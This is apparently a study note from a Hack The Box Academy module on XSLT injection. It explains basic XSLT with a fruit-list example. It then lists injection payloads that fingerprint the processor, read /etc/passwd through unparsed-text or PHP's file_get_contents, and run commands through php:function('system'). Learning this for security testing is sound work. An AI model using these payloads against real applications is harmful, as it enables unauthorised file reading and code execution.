---
title: XSLT injection 🏞️
---
> Info extracted from [HTB Academy](https://academy.hackthebox.com/module/145/section/1343)

>[!Info]
>[eXtensible Stylesheet Language Transformation (XSLT)](https://www.w3.org/TR/xslt-30/) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.


## eXtensible Stylesheet Language Transformation (XSLT)

Since XSLT operates on XML-based data, we will consider the following sample XML document to explore how XSLT operates:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

XSLT can be used to define a data format which is subsequently enriched with data from the XML document. XSLT data is structured similarly to XML. However, it contains XSL elements within nodes prefixed with the `xsl`-prefix. The following are some commonly used XSL elements:

- `<xsl:template>`: This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML document that the template applies to
- `<xsl:value-of>`: This element extracts the value of the XML node specified in the `select` attribute
- `<xsl:for-each>`: This element enables looping over all XML nodes specified in the `select` attribute

For instance, a simple XSLT document used to output all fruits contained within the XML document as well as their color, may look like this:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

As we can see, the XSLT document contains a single `<xsl:template>` XSL element that is applied to the `<fruits>` node in the XML document. The template consists of the static string `Here are all the fruits:` and a loop over all `<fruit>` nodes in the XML document. For each of these nodes, the values of the `<name>` and `<color>` nodes are printed using the `<xsl:value-of>` XSL element. Combining the sample XML document with the above XSLT data results in the following output:

```
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```

Here are some additional XSL elements that can be used to narrow down further or customize the data from an XML document:

- `<xsl:sort>`: This element specifies how to sort elements in a for loop in the `select` argument. Additionally, a sort order may be specified in the `order` argument
    
- `<xsl:if>`: This element can be used to test for conditions on a node. The condition is specified in the `test` argument.
    

For instance, we can use these XSL elements to create a list of all fruits that are of a medium size ordered by their color in descending order:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

This results in the following data:

```
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```

XSLT can be used to generate arbitrary output strings. For instance, web applications may use it to embed data from XML documents within an HTML response.

## Information Disclosure

We can try to infer some basic information about the XSLT processor in use by injecting the following XSLT elements:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

The web application provides the following response:

![](Pasted%20image%2020240723114433.png)

Since the web application interpreted the XSLT elements we provided, this confirms an XSLT injection vulnerability. Furthermore, we can deduce that the web application seems to rely on the `libxslt` library and supports XSLT version `1.0`.

## Local File Inclusion (LFI)

We can try to use multiple different functions to read a local file. Whether a payload will work depends on the XSLT version and the configuration of the XSLT library. For instance, XSLT contains a function `unparsed-text` that can be used to read a local file:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

However, it was only introduced in XSLT version 2.0. Thus, our sample web application does not support this function and instead errors out. However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

Our sample web application is configured to support PHP functions. As such, the local file is displayed in the response:

![](Pasted%20image%2020240723120637.png)

## Remote Code Execution (RCE)

If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function `system` to execute a command:

```xml
<xsl:value-of select="php:function('system','id')" />
```

![](Pasted%20image%2020240723120723.png)

